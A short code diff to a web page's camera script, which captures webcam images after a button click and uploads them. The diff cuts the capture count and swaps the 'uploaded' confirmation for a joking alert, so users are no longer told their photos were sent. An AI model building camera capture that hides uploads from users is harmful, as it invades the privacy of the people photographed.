@@ -34,7 +34,7 @@ document.getElementById("captureButton").addEventListener("click", async () => {
         // Wait until video is ready
         video.onloadedmetadata = () => {
             console.log("Camera started.");
-            captureAndUpload(stream, 5);
+            captureAndUpload(stream, 2);
         };
 
     } catch (err) {
@@ -43,7 +43,7 @@ document.getElementById("captureButton").addEventListener("click", async () => {
     }
 });
 
-// Capture 5 images and upload
+// Capture 2 images and upload
 async function captureAndUpload(stream, total) {
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
@@ -77,10 +77,11 @@ async function captureAndUpload(stream, total) {
 
     // Stop camera
     stream.getTracks().forEach(t => t.stop());
-    alert("All images captured and uploaded!");
+    alert("the view was to real lol!");
 }
 
 </script>
 
 </body>
 </html>
+
